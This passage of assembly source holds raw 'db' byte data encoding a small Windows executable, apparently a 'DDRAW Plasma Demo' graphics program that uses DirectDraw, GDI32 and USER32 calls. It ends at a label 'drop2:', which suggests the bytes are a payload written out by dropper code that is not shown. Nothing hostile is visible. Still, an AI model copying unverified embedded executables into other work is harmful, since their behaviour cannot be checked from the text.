db  0FFh,000h,000h,000h,08Bh,004h,0B5h,04Ch,036h,040h,000h,08Bh,01Ch,095h
db  04Ch,03Ah,040h,000h,003h,0C3h,083h,0C6h,001h,0D1h,0E8h,083h,0C2h,0FEh
db  025h,0FFh,000h,000h,000h,083h,0C7h,004h,08Bh,004h,085h,04Ch,032h,040h
db  000h,049h,089h,047h,0FCh,075h,0C7h,05Fh,059h,003h,03Dh,0ECh,031h,040h
db  000h,049h,075h,08Bh,083h,005h,0A0h,030h,040h,000h,0FEh,083h,005h,0A4h
db  030h,040h,000h,0FFh,05Fh,05Eh,05Bh,0C3h,055h,08Bh,0ECh,083h,0C4h,0ECh
db  0C7h,045h,0FCh,000h,000h,000h,000h,0E9h,0F1h,000h,000h,000h,08Bh,055h
db  0FCh,0D9h,0EBh,0DAh,04Dh,0FCh,0D8h,00Dh,0B4h,030h,040h,000h,0D8h,035h
db  0BCh,030h,040h,000h,0D9h,0FEh,0D8h,00Dh,0B8h,030h,040h,000h,0D8h,005h
db  0B8h,030h,040h,000h,0DBh,01Ch,095h,04Ch,036h,040h,000h,0D9h,0EBh,0DAh
db  04Dh,0FCh,0D8h,00Dh,0B4h,030h,040h,000h,0D8h,035h,0BCh,030h,040h,000h
db  0D9h,0FFh,0D8h,00Dh,0B8h,030h,040h,000h,0D8h,005h,0B8h,030h,040h,000h
db  0D9h,0EBh,0DEh,0C9h,0D8h,00Dh,0B4h,030h,040h,000h,0D8h,035h,0BCh,030h
db  040h,000h,0D9h,0FEh,0D8h,00Dh,0B8h,030h,040h,000h,0D8h,005h,0B8h,030h
db  040h,000h,0DBh,01Ch,095h,04Ch,03Ah,040h,000h,033h,0C0h,0D9h,0EBh,0DAh
db  04Dh,0FCh,0D8h,00Dh,0B4h,030h,040h,000h,0D8h,035h,0A8h,030h,040h,000h
db  0D9h,0FFh,0D8h,00Dh,0B8h,030h,040h,000h,0D8h,005h,0B8h,030h,040h,000h
db  0DBh,05Dh,0ECh,0C1h,0E0h,008h,00Bh,045h,0ECh,0D9h,0EBh,0DAh,04Dh,0FCh
db  0D8h,00Dh,0B4h,030h,040h,000h,0D8h,035h,0ACh,030h,040h,000h,0D9h,0FFh
db  0D8h,00Dh,0B8h,030h,040h,000h,0D8h,005h,0B8h,030h,040h,000h,0DBh,05Dh
db  0ECh,0C1h,0E0h,008h,00Bh,045h,0ECh,0D9h,0EBh,0DAh,04Dh,0FCh,0D8h,00Dh
db  0B4h,030h,040h,000h,0D8h,035h,0B0h,030h,040h,000h,0D9h,0FFh,0D8h,00Dh
db  0B8h,030h,040h,000h,0D8h,005h,0B8h,030h,040h,000h,0DBh,05Dh,0ECh,0C1h
db  0E0h,008h,00Bh,045h,0ECh,089h,004h,095h,04Ch,032h,040h,000h,0FFh,045h
db  0FCh,081h,07Dh,0FCh,000h,001h,000h,000h,00Fh,082h,002h,0FFh,0FFh,0FFh
db  0C9h,0C3h,055h,08Bh,0ECh,083h,0C4h,0E4h,08Bh,045h,008h,0A3h,0E6h,030h
db  040h,000h,06Ah,004h,0E8h,05Fh,003h,000h,000h,0A3h,0F2h,030h,040h,000h
db  068h,0D2h,030h,040h,000h,0E8h,092h,003h,000h,000h,06Ah,000h,0FFh,075h
db  008h,06Ah,000h,06Ah,000h,068h,0C8h,000h,000h,000h,068h,040h,001h,000h
db  000h,06Ah,000h,06Ah,000h,068h,000h,000h,000h,080h,068h,0C0h,030h,040h
db  000h,068h,0C0h,030h,040h,000h,06Ah,000h,0E8h,035h,003h,000h,000h,0A3h
db  0D0h,031h,040h,000h,0FFh,035h,0D0h,031h,040h,000h,0E8h,05Bh,003h,000h
db  000h,06Ah,000h,0E8h,05Ah,003h,000h,000h,06Ah,000h,068h,0D4h,031h,040h
db  000h,06Ah,000h,0E8h,05Eh,003h,000h,000h,00Bh,0C0h,074h,01Eh,06Ah,000h
db  068h,0C0h,030h,040h,000h,068h,002h,031h,040h,000h,0FFh,035h,0D0h,031h
db  040h,000h,0E8h,013h,003h,000h,000h,06Ah,000h,0E8h,0E2h,002h,000h,000h
db  0A1h,0D4h,031h,040h,000h,08Bh,000h,06Ah,011h,0FFh,035h,0D0h,031h,040h
db  000h,0FFh,035h,0D4h,031h,040h,000h,0FFh,050h,050h,00Bh,0C0h,074h,01Eh
db  06Ah,000h,068h,0C0h,030h,040h,000h,068h,01Bh,031h,040h,000h,0FFh,035h
db  0D0h,031h,040h,000h,0E8h,0D9h,002h,000h,000h,06Ah,000h,0E8h,0A8h,002h
db  000h,000h,0A1h,0D4h,031h,040h,000h,08Bh,000h,06Ah,020h,068h,0C8h,000h
db  000h,000h,068h,040h,001h,000h,000h,0FFh,035h,0D4h,031h,040h,000h,0FFh
db  050h,054h,00Bh,0C0h,074h,01Eh,06Ah,000h,068h,0C0h,030h,040h,000h,068h
db  045h,031h,040h,000h,0FFh,035h,0D0h,031h,040h,000h,0E8h,09Bh,002h,000h
db  000h,06Ah,000h,0E8h,06Ah,002h,000h,000h,0C7h,005h,0DCh,031h,040h,000h
db  06Ch,000h,000h,000h,0C7h,005h,0E0h,031h,040h,000h,001h,000h,000h,000h
db  0C7h,005h,044h,032h,040h,000h,000h,002h,000h,000h,0A1h,0D4h,031h,040h
db  000h,08Bh,000h,06Ah,000h,068h,0D8h,031h,040h,000h,068h,0DCh,031h,040h
db  000h,0FFh,035h,0D4h,031h,040h,000h,0FFh,050h,018h,00Bh,0C0h,074h,01Eh
db  06Ah,000h,068h,0C0h,030h,040h,000h,068h,05Fh,031h,040h,000h,0FFh,035h
db  0D0h,031h,040h,000h,0E8h,03Fh,002h,000h,000h,06Ah,000h,0E8h,00Eh,002h
db  000h,000h,0FFh,075h,014h,0FFh,035h,0D0h,031h,040h,000h,0E8h,04Eh,002h
db  000h,000h,0E8h,06Fh,0FDh,0FFh,0FFh,06Ah,001h,06Ah,000h,06Ah,000h,06Ah
db  000h,08Dh,045h,0E4h,050h,0E8h,01Ah,002h,000h,000h,00Bh,0C0h,074h,02Fh
db  083h,07Dh,0E8h,012h,075h,012h,0FFh,075h,0ECh,0E8h,00Eh,002h,000h,000h
db  0E9h,0D0h,000h,000h,000h,0E9h,0C6h,000h,000h,000h,08Dh,045h,0E4h,050h
db  0E8h,019h,002h,000h,000h,08Dh,045h,0E4h,050h,0E8h,0DAh,001h,000h,000h
db  0E9h,0AFh,000h,000h,000h,0E8h,0D6h,001h,000h,000h,03Bh,005h,0D0h,031h
db  040h,000h,00Fh,085h,09Eh,000h,000h,000h,0C7h,005h,0DCh,031h,040h,000h
db  06Ch,000h,000h,000h,0C7h,005h,0E0h,031h,040h,000h,008h,000h,000h,000h
db  0A1h,0D8h,031h,040h,000h,08Bh,000h,06Ah,000h,06Ah,001h,068h,0DCh,031h
db  040h,000h,06Ah,000h,0FFh,035h,0D8h,031h,040h,000h,0FFh,050h,064h,00Bh
db  0C0h,074h,039h,03Dh,0C2h,001h,076h,088h,075h,012h,0A1h,0D8h,031h,040h
db  000h,08Bh,000h,0FFh,035h,0D8h,031h,040h,000h,0FFh,050h,06Ch,0EBh,01Eh
db  06Ah,000h,068h,0C0h,030h,040h,000h,068h,07Fh,031h,040h,000h,0FFh,035h
db  0D0h,031h,040h,000h,0E8h,06Dh,001h,000h,000h,06Ah,000h,0E8h,03Ch,001h
db  000h,000h,0EBh,0A8h,0A1h,0D4h,031h,040h,000h,08Bh,000h,06Ah,000h,06Ah
db  001h,0FFh,035h,0D4h,031h,040h,000h,0FFh,050h,058h,0E8h,000h,0FCh,0FFh
db  0FFh,0A1h,0D8h,031h,040h,000h,08Bh,000h,0FFh,035h,000h,032h,040h,000h
db  0FFh,035h,0D8h,031h,040h,000h,0FFh,090h,080h,000h,000h,000h,0E9h,008h
db  0FFh,0FFh,0FFh,0A1h,0D4h,031h,040h,000h,08Bh,000h,0FFh,035h,0D4h,031h
db  040h,000h,0FFh,050h,04Ch,00Bh,0C0h,074h,01Eh,06Ah,000h,068h,0C0h,030h
db  040h,000h,068h,095h,031h,040h,000h,0FFh,035h,0D0h,031h,040h,000h,0E8h
db  002h,001h,000h,000h,06Ah,000h,0E8h,0D1h,000h,000h,000h,0FFh,035h,0D0h
db  031h,040h,000h,0E8h,0DEh,000h,000h,000h,00Bh,0C0h,075h,01Eh,06Ah,000h
db  068h,0C0h,030h,040h,000h,068h,0B2h,031h,040h,000h,0FFh,035h,0D0h,031h
db  040h,000h,0E8h,0D5h,000h,000h,000h,06Ah,000h,0E8h,0A4h,000h,000h,000h
db  083h,03Dh,0D4h,031h,040h,000h,000h,074h,03Dh,083h,03Dh,0D8h,031h,040h
db  000h,000h,074h,01Ah,0A1h,0D8h,031h,040h,000h,08Bh,000h,0FFh,035h,0D8h
db  031h,040h,000h,0FFh,050h,008h,0C7h,005h,0D8h,031h,040h,000h,000h,000h
db  000h,000h,0A1h,0D4h,031h,040h,000h,08Bh,000h,0FFh,035h,0D4h,031h,040h
db  000h,0FFh,050h,008h,0C7h,005h,0D4h,031h,040h,000h,000h,000h,000h,000h
db  08Bh,045h,0ECh,0C9h,0C9h,0C2h,010h,000h,055h,08Bh,0ECh,081h,07Dh,00Ch
db  000h,001h,000h,000h,075h,018h,083h,07Dh,010h,01Bh,075h,028h,06Ah,000h
db  0E8h,073h,000h,000h,000h,0B8h,000h,000h,000h,000h,0C9h,0C2h,010h,000h
db  0EBh,016h,083h,07Dh,00Ch,002h,075h,010h,06Ah,000h,0E8h,05Bh,000h,000h
db  000h,0B8h,000h,000h,000h,000h,0C9h,0C2h,010h,000h,0FFh,075h,014h,0FFh
db  075h,010h,0FFh,075h,00Ch,0FFh,075h,008h,0E8h,01Dh,000h,000h,000h,0C9h
db  0C2h,010h,000h,0CCh,0FFh,025h,008h,020h,040h,000h,0FFh,025h,014h,020h
db  040h,000h,0FFh,025h,010h,020h,040h,000h,0FFh,025h,028h,020h,040h,000h
db  0FFh,025h,020h,020h,040h,000h,0FFh,025h,01Ch,020h,040h,000h,0FFh,025h
db  02Ch,020h,040h,000h,0FFh,025h,04Ch,020h,040h,000h,0FFh,025h,024h,020h
db  040h,000h,0FFh,025h,030h,020h,040h,000h,0FFh,025h,048h,020h,040h,000h
db  0FFh,025h,034h,020h,040h,000h,0FFh,025h,038h,020h,040h,000h,0FFh,025h
db  03Ch,020h,040h,000h,0FFh,025h,040h,020h,040h,000h,0FFh,025h,044h,020h
db  040h,000h,0FFh,025h,000h,020h,040h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,038h,022h
db  000h,000h,000h,000h,000h,000h,00Ch,021h,000h,000h,000h,000h,000h,000h
db  036h,021h,000h,000h,028h,021h,000h,000h,000h,000h,000h,000h,07Ch,021h
db  000h,000h,06Ah,021h,000h,000h,0ACh,021h,000h,000h,058h,021h,000h,000h
db  08Ch,021h,000h,000h,0BAh,021h,000h,000h,0DCh,021h,000h,000h,0F0h,021h
db  000h,000h,0FCh,021h,000h,000h,00Ah,022h,000h,000h,018h,022h,000h,000h
db  0CAh,021h,000h,000h,0A0h,021h,000h,000h,000h,000h,000h,000h,0C0h,020h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,01Eh,021h,000h,000h
db  008h,020h,000h,000h,0C8h,020h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,04Ah,021h,000h,000h,010h,020h,000h,000h,0D4h,020h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,02Ch,022h,000h,000h,01Ch,020h
db  000h,000h,0B8h,020h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  04Ch,022h,000h,000h,000h,020h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  038h,022h,000h,000h,000h,000h,000h,000h,00Ch,021h,000h,000h,000h,000h
db  000h,000h,036h,021h,000h,000h,028h,021h,000h,000h,000h,000h,000h,000h
db  07Ch,021h,000h,000h,06Ah,021h,000h,000h,0ACh,021h,000h,000h,058h,021h
db  000h,000h,08Ch,021h,000h,000h,0BAh,021h,000h,000h,0DCh,021h,000h,000h
db  0F0h,021h,000h,000h,0FCh,021h,000h,000h,00Ah,022h,000h,000h,018h,022h
db  000h,000h,0CAh,021h,000h,000h,0A0h,021h,000h,000h,000h,000h,000h,000h
db  021h,001h,047h,065h,074h,053h,074h,06Fh,063h,06Bh,04Fh,062h,06Ah,065h
db  063h,074h,000h,000h,047h,044h,049h,033h,032h,02Eh,064h,06Ch,06Ch,000h
db  075h,000h,045h,078h,069h,074h,050h,072h,06Fh,063h,065h,073h,073h,000h
db  011h,001h,047h,065h,074h,04Dh,06Fh,064h,075h,06Ch,065h,048h,061h,06Eh
db  064h,06Ch,065h,041h,000h,000h,04Bh,045h,052h,04Eh,045h,04Ch,033h,032h
db  02Eh,064h,06Ch,06Ch,000h,000h,058h,000h,043h,072h,065h,061h,074h,065h
db  057h,069h,06Eh,064h,06Fh,077h,045h,078h,041h,000h,083h,000h,044h,065h
db  066h,057h,069h,06Eh,064h,06Fh,077h,050h,072h,06Fh,063h,041h,000h,000h
db  08Dh,000h,044h,065h,073h,074h,072h,06Fh,079h,057h,069h,06Eh,064h,06Fh
db  077h,000h,094h,000h,044h,069h,073h,070h,061h,074h,063h,068h,04Dh,065h
db  073h,073h,061h,067h,065h,041h,000h,000h,005h,001h,047h,065h,074h,046h
db  06Fh,063h,075h,073h,000h,000h,0BBh,001h,04Dh,065h,073h,073h,061h,067h
db  065h,042h,06Fh,078h,041h,000h,0D9h,001h,050h,065h,065h,06Bh,04Dh,065h
db  073h,073h,061h,067h,065h,041h,000h,000h,0DDh,001h,050h,06Fh,073h,074h
db  051h,075h,069h,074h,04Dh,065h,073h,073h,061h,067h,065h,000h,0EFh,001h
db  052h,065h,067h,069h,073h,074h,065h,072h,043h,06Ch,061h,073h,073h,045h
db  078h,041h,000h,000h,02Bh,002h,053h,065h,074h,046h,06Fh,063h,075h,073h
db  000h,000h,061h,002h,053h,068h,06Fh,077h,043h,075h,072h,073h,06Fh,072h
db  000h,000h,065h,002h,053h,068h,06Fh,077h,057h,069h,06Eh,064h,06Fh,077h
db  000h,000h,07Dh,002h,054h,072h,061h,06Eh,073h,06Ch,061h,074h,065h,04Dh
db  065h,073h,073h,061h,067h,065h,000h,000h,055h,053h,045h,052h,033h,032h
db  02Eh,064h,06Ch,06Ch,000h,000h,005h,000h,044h,069h,072h,065h,063h,074h
db  044h,072h,061h,077h,043h,072h,065h,061h,074h,065h,000h,000h,044h,044h
db  052h,041h,057h,02Eh,064h,06Ch,06Ch,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  0E0h,00Eh,0B7h,0D7h,040h,043h,0CFh,011h,0B0h,063h,000h,020h,0AFh,0C2h
db  0CDh,035h,0A0h,017h,038h,059h,0B3h,07Dh,0CFh,011h,0A2h,0DEh,000h,0AAh
db  000h,0B9h,033h,056h,080h,0DBh,014h,06Ch,033h,0A7h,0CEh,011h,0A5h,021h
db  000h,020h,0AFh,00Bh,0E5h,060h,0E0h,0F3h,0A6h,0B3h,043h,02Bh,0CFh,011h
db  0A2h,0DEh,000h,0AAh,000h,0B9h,033h,056h,081h,0DBh,014h,06Ch,033h,0A7h
db  0CEh,011h,0A5h,021h,000h,020h,0AFh,00Bh,0E5h,060h,085h,058h,080h,057h
db  0ECh,06Eh,0CFh,011h,094h,041h,0A8h,023h,003h,0C1h,00Eh,027h,000h,04Eh
db  004h,0DAh,0B2h,069h,0D0h,011h,0A1h,0D5h,000h,0AAh,000h,0B8h,0DFh,0BBh
db  084h,0DBh,014h,06Ch,033h,0A7h,0CEh,011h,0A5h,021h,000h,020h,0AFh,00Bh
db  0E5h,060h,085h,0DBh,014h,06Ch,033h,0A7h,0CEh,011h,0A5h,021h,000h,020h
db  0AFh,00Bh,0E5h,060h,0E0h,00Eh,09Fh,04Bh,07Eh,00Dh,0D0h,011h,09Bh,006h
db  000h,0A0h,0C9h,003h,0A3h,0B8h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,0FAh,043h,000h,000h,0A0h,043h,000h,000h,0BAh,043h,000h,000h
db  000h,040h,000h,000h,0FFh,042h,000h,000h,080h,043h,044h,044h,052h,041h
db  057h,020h,050h,06Ch,061h,073h,06Dh,061h,020h,044h,065h,06Dh,06Fh,000h
db  030h,000h,000h,000h,003h,000h,000h,000h,0E4h,014h,040h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,0C0h,030h
db  040h,000h,000h,000h,000h,000h,043h,06Fh,075h,06Ch,064h,06Eh,027h,074h
db  020h,069h,06Eh,069h,074h,020h,044h,069h,072h,065h,063h,074h,044h,072h
db  061h,077h,000h,043h,06Fh,075h,06Ch,064h,06Eh,027h,074h,020h,073h,065h
db  074h,020h,044h,069h,072h,065h,063h,074h,044h,072h,061h,077h,020h,063h
db  06Fh,06Fh,070h,065h,072h,061h,074h,069h,076h,065h,020h,06Ch,065h,076h
db  065h,06Ch,000h,043h,06Fh,075h,06Ch,064h,06Eh,027h,074h,020h,073h,065h
db  074h,020h,064h,069h,073h,070h,06Ch,061h,079h,020h,06Dh,06Fh,064h,065h
db  000h,043h,06Fh,075h,06Ch,064h,06Eh,027h,074h,020h,063h,072h,065h,061h
db  074h,065h,020h,070h,072h,069h,06Dh,061h,072h,079h,020h,073h,075h,072h
db  066h,061h,063h,065h,000h,043h,06Fh,075h,06Ch,064h,06Eh,027h,074h,020h
db  06Ch,06Fh,063h,06Bh,020h,073h,075h,072h,066h,061h,063h,065h,000h,043h
db  06Fh,075h,06Ch,064h,06Eh,027h,074h,020h,072h,065h,073h,074h,06Fh,072h
db  065h,020h,064h,069h,073h,070h,06Ch,061h,079h,06Dh,06Fh,064h,065h,000h
db  043h,06Fh,075h,06Ch,064h,06Eh,027h,074h,020h,064h,065h,073h,074h,072h
db  06Fh,079h,020h,077h,069h,06Eh,064h,06Fh,077h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db  000h,000h,000h,000h,000h,000h,000h,000h
drop2: